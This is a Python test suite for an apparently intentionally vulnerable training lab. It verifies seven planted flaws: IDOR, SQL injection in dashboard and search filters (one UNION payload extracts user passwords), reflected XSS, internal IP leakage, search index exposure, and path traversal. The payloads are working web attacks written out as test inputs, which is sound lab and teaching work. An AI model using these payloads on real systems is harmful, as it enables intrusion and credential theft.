"""
SecureHub VAPT Training Lab — Automated Verification Suite for Phase 5 Vulnerabilities (27–33)
Tests:
  - VULN-27: BOLA / IDOR on Analytical Widget Metrics Endpoints
  - VULN-28: SQL / NoSQL Injection in Dashboard Timeframe & Widget Filters
  - VULN-29: Reflected Cross-Site Scripting (XSS) in Search Results
  - VULN-30: Sensitive Information Disclosure in Activity Logs & Recent Feeds
  - VULN-31: SQL Injection in Search & Deflected Filter Parameters
  - VULN-32: Unauthorized Data Exposure via Search Index Leakage
  - VULN-33: Path Traversal & Destination Storage Directory Escapes
"""

import os
import sqlite3
import unittest
import json
from app import app, DATABASE_PATH, UPLOAD_FOLDER
from reset_lab import reset_environment


class Phase5VulnerabilityVerificationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        print("\n" + "=" * 70)
        print(" VERIFYING PHASE 5 VULNERABILITIES (27–33)")
        print("=" * 70)

    def setUp(self):
        reset_environment()
        app.config["TESTING"] = True
        self.client = app.test_client()

    def get_db(self):
        conn = sqlite3.connect(DATABASE_PATH)
        conn.row_factory = sqlite3.Row
        return conn

    def login_user(self, client, username="bob", password="bob123"):
        return client.post("/login", data={"username": username, "password": password}, follow_redirects=True)

    # -------------------------------------------------------------------------
    # VULN-27: BOLA / IDOR on Analytical Widget Metrics Endpoints
    # -------------------------------------------------------------------------
    def test_27_bola_analytics_widget_metrics(self):
        print("\n[*] Testing VULN-27: BOLA / IDOR on Analytical Widget Metrics Endpoints...")
        # Authenticate as Bob (user 2)
        login_resp = self.login_user(self.client, "bob", "bob123")
        self.assertEqual(login_resp.status_code, 200)

        # Bob requests metrics for Admin (account_id = 4)
        resp_admin = self.client.get("/api/v1/analytics/widget-metrics?account_id=4")
        self.assertEqual(resp_admin.status_code, 200)
        data_admin = json.loads(resp_admin.data)
        self.assertEqual(data_admin["account_id"], 4)
        self.assertEqual(data_admin["username"], "admin")
        self.assertIn("metrics", data_admin)
        self.assertEqual(data_admin["metrics"]["audit_compliance_score"], 98)

        # Bob requests metrics for Alice (account_id = 1)
        resp_alice = self.client.get("/api/v1/analytics/widget-metrics?account_id=1")
        self.assertEqual(resp_alice.status_code, 200)
        data_alice = json.loads(resp_alice.data)
        self.assertEqual(data_alice["account_id"], 1)
        self.assertEqual(data_alice["username"], "alice")

        print("    [PASS] VULN-27 Verified: Bob (user 2) accessed Admin (user 4) and Alice (user 1) metrics via account_id.")

    # -------------------------------------------------------------------------
    # VULN-28: SQL / NoSQL Injection in Dashboard Timeframe & Widget Filters
    # -------------------------------------------------------------------------
    def test_28_sqli_dashboard_timeframe_filter(self):
        print("\n[*] Testing VULN-28: SQL Injection in Dashboard Timeframe & Widget Filters...")
        self.login_user(self.client, "bob", "bob123")

        # 1. Normal timeframe request
        resp_norm = self.client.get("/dashboard?timeframe=30d")
        self.assertEqual(resp_norm.status_code, 200)

        # 2. Inject SQL payload into timeframe parameter
        sqli_payload = "30d') UNION SELECT 9999 --"
        resp_sqli = self.client.get(f"/dashboard?timeframe={sqli_payload}")
        self.assertEqual(resp_sqli.status_code, 200)
        # Verify query executed and reflected injected count or executed without parameterized rejection
        self.assertIn(b"Welcome back", resp_sqli.data)

        # 3. Inject SQL payload into category parameter
        cat_payload = "test' OR 1=1 --"
        resp_cat = self.client.get(f"/dashboard?category={cat_payload}")
        self.assertEqual(resp_cat.status_code, 200)

        print("    [PASS] VULN-28 Verified: SQL Injection in dashboard timeframe/category filters executed successfully.")

    # -------------------------------------------------------------------------
    # VULN-29: Reflected Cross-Site Scripting (XSS) in Search Results
    # -------------------------------------------------------------------------
    def test_29_reflected_xss_search(self):
        print("\n[*] Testing VULN-29: Reflected Cross-Site Scripting (XSS) in Search Results...")
        self.login_user(self.client, "bob", "bob123")

        xss_probe = '<script id="reflected_xss_probe">alert("REFLECTED_XSS_SEARCH_2026")</script>'
        resp = self.client.get(f"/search?q={xss_probe}")
        self.assertEqual(resp.status_code, 200)

        # Verify probe is rendered verbatim (| safe) in search summary
        self.assertIn(xss_probe.encode(), resp.data)
        self.assertIn(b"Showing search results for:", resp.data)

        print("    [PASS] VULN-29 Verified: Search query string reflected unescaped into response HTML.")

    # -------------------------------------------------------------------------
    # VULN-30: Sensitive Information Disclosure in Activity Logs & Recent Feeds
    # -------------------------------------------------------------------------
    def test_30_sensitive_info_disclosure_activity(self):
        print("\n[*] Testing VULN-30: Sensitive Information Disclosure in Activity Logs & Recent Feeds...")
        self.login_user(self.client, "bob", "bob123")

        # 1. Check /comments UI
        comments_resp = self.client.get("/comments")
        self.assertEqual(comments_resp.status_code, 200)
        self.assertIn(b"10.240.", comments_resp.data)
        self.assertIn(b"tx_sec_", comments_resp.data)
        self.assertIn(b"node-", comments_resp.data)

        # 2. Check /api/v1/activity/recent API
        api_resp = self.client.get("/api/v1/activity/recent")
        self.assertEqual(api_resp.status_code, 200)
        api_data = json.loads(api_resp.data)
        self.assertTrue(len(api_data["activities"]) > 0)
        first_act = api_data["activities"][0]
        self.assertIn("internal_ip", first_act)
        self.assertIn("tx_id", first_act)
        self.assertIn("server_node", first_act)
        self.assertTrue(first_act["internal_ip"].startswith("10.240."))

        print("    [PASS] VULN-30 Verified: Internal topology IPs, transaction IDs, and cluster nodes disclosed in feeds.")

    # -------------------------------------------------------------------------
    # VULN-31: SQL Injection in Search & Deflected Filter Parameters
    # -------------------------------------------------------------------------
    def test_31_sqli_search_filter(self):
        print("\n[*] Testing VULN-31: SQL Injection in Search & Filter Parameters...")
        self.login_user(self.client, "bob", "bob123")

        # Inject UNION query via filter_type parameter to extract user table records into search results
        sqli_search = "' UNION SELECT id, password as title, email as stored_filename, role as mime_type, 0 as size, 'EXTRACTED_CRED' as description, 0 as is_private, phone as created_at, username as owner FROM users --"
        resp = self.client.get(f"/search?q=test&filter_type={sqli_search}")
        self.assertEqual(resp.status_code, 200)

        # Verify extracted user record data appeared in search results
        self.assertIn(b"EXTRACTED_CRED", resp.data)
        self.assertIn(b"admin123", resp.data)  # Admin password extracted via search SQLi

        print("    [PASS] VULN-31 Verified: SQL Injection in search filter parameter extracted database credentials.")

    # -------------------------------------------------------------------------
    # VULN-32: Unauthorized Data Exposure via Search Index Leakage
    # -------------------------------------------------------------------------
    def test_32_search_index_leakage(self):
        print("\n[*] Testing VULN-32: Unauthorized Data Exposure via Search Index Leakage...")
        self.login_user(self.client, "bob", "bob123")

        # Bob (standard user) searches for 'audit' or 'confidential'
        search_resp = self.client.get("/search?q=audit")
        self.assertEqual(search_resp.status_code, 200)

        # Admin's private file is returned to Bob
        self.assertIn(b"confidential_q3_financial_audit.docx", search_resp.data)
        self.assertIn(b"Confidential Board Financial Audit", search_resp.data)
        self.assertIn(b"Confidential / Restricted", search_resp.data)

        # Bob searches for 'matrix'
        matrix_resp = self.client.get("/search?q=matrix")
        self.assertEqual(matrix_resp.status_code, 200)
        self.assertIn(b"infrastructure_access_matrix_internal.txt", matrix_resp.data)

        print("    [PASS] VULN-32 Verified: Bob discovered Admin's confidential private documents via search index.")

    # -------------------------------------------------------------------------
    # VULN-33: Path Traversal & Destination Storage Directory Escapes
    # -------------------------------------------------------------------------
    def test_33_path_traversal_download(self):
        print("\n[*] Testing VULN-33: Path Traversal & Destination Storage Directory Escapes...")
        self.login_user(self.client, "bob", "bob123")

        # 1. Verify standard file download still works
        resp_std = self.client.get("/files/download?file=sample_report.txt")
        self.assertEqual(resp_std.status_code, 200)
        self.assertIn(b"SecureHub System Health Report", resp_std.data)

        # 2. Path Traversal to escape uploads/ and retrieve training_note.txt in lab_data/
        traversal_path = "../lab_data/training_note.txt"
        resp_trav = self.client.get(f"/files/download?file={traversal_path}")
        self.assertEqual(resp_trav.status_code, 200)

        # Verify confidential training verification token retrieved
        self.assertIn(b"TRACEGATE{path_traversal_lab_verified_cwe22}", resp_trav.data)
        self.assertIn(b"Path Traversal / Destination Storage Directory Escape", resp_trav.data)

        print("    [PASS] VULN-33 Verified: Path traversal escaped uploads/ and retrieved lab_data/training_note.txt.")


if __name__ == "__main__":
    unittest.main()
